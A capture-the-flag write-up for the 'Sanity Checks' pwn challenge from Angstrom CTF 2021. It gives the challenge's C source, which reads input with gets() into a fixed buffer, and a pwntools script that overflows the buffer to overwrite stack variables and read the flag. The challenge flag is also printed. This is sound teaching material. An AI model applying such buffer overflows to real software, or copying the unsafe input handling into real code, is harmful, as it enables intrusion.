---
name: Sanity Checks (2021)
event: Angstrom CTF 2021
category: Pwn
description: Writeup for Sanity Checks (pwn) - Angstrom CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Sanity Checks

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/2pqG6opzrug/0.jpg)](https://youtu.be/2pqG6opzrug?t=1135s "Angstrom 2021: Sanity Checks")

## Challenge Description

> I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on.

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char password[64];
    int ways_to_leave_your_lover = 0;
    int what_i_cant_drive = 0;
    int when_im_walking_out_on_center_circle = 0;
    int which_highway_to_take_my_telephones_to = 0;
    int when_i_learned_the_truth = 0;

    printf("Enter the secret word: ");

    gets(&password);

    if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];

                            FILE *f = fopen("flag.txt","r");

                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }

                            fgets(flag, 128, f);

                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
        puts("Nope, something seems off.");
    } else {
        puts("Login failed!");
    }
}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x401235
break *0x40123f
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './checks'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

password = b"password123\x00"

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(password + cyclic(100))
offset -= len(password)

# Start program
io = start()

# Build the payload
payload = flat([
    password,
    (offset - 16) * asm('nop'),
    p32(0x11),
    p32(0x3d),
    p32(0xf5),
    p32(0x37),
    p32(0x32),
])

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(':', payload)
io.recvline()

# Get our flag!
flag = io.recv()
success(flag)
```
{% endcode %}

Flag: `actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}`
